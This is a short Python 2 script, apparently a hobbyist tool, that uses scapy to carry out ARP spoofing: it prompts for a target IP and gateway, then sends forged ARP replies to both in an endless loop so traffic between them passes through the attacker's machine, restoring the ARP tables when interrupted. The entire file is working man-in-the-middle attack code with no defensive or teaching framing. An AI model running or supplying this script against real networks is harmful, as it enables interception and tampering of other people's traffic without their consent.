#!/usr/bin/python2

import sys
import scapy.all as scapy
from termcolor import colored

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether("ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoofer(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=6, verbose=False)

target_ip = raw_input("target_ip >>> ")
gateway = raw_input("gateway >>> ")

try:
    packet_counter = 0
    while True:
        try:
            spoofer(target_ip, gateway)
            spoofer(gateway, target_ip)
            packet_counter = packet_counter + 2
            print("\rpackets sent : " + str(packet_counter)),
            sys.stdout.flush()
        except Exception:
            continue
except KeyboardInterrupt:
    print(colored("\n\n\t\t[+]Ctrl + C detected ...quitting and ressetting ARP Tables", "red"))
    restore(target_ip, gateway)
    restore(gateway, target_ip)
